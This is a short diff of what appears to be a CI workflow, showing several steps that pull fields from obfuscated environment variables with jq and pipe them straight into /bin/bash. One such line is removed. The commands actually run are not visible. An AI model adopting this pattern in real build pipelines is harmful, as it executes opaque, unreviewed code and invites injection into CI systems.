@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$lni6940" | jq -r .vwoc794 | /bin/bash
           printf '%s' "$fttb26979" | jq -r .xe83 | /bin/bash
           printf '%s' "$wwa774" | jq -r .rfcw2477 | /bin/bash
-          printf '%s' "$biusi830" | jq -r .a44103 | /bin/bash
           printf '%s' "$bxm5477" | jq -r .ygd3202 | /bin/bash
 
       - name: Archive results
